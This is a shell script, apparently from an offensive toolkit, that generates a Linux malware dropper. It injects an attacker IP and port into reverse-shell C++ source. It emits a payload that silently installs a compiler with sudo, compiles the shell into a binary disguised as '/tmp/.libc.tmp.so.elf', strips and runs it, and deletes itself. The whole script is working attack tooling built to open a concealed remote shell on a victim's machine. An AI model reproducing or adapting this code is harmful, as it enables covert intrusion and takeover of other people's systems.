source $PODGL/lib/fsh.cfg.sh
source $PODGL/lib/colors

CWD=$PODGL/sys/malware/linux/reverse_shell

code=$(cat $PODGL/sys/malware/dropper/linux/reverse_shell/reverse.cpp)
printf "code='" > $3
printf "#define PORT $2\n#define IP "'"'"$1"'"'" " >> $3
echo "$code" >> $3
printf "'" >> $3

code2='
sudo apt install clang &> /dev/null
echo "$code" > ~/.tmpfile.cpp
type g++ &>/dev/null &&(sudo g++ ~/.tmpfile.cpp -o /tmp/.libc.tmp.so.elf && rm ~/.tmpfile.cpp && strip /tmp/.libc.tmp.so.elf)
/tmp/.libc.tmp.so.elf
rm $0
'
echo "$code2" >> $3
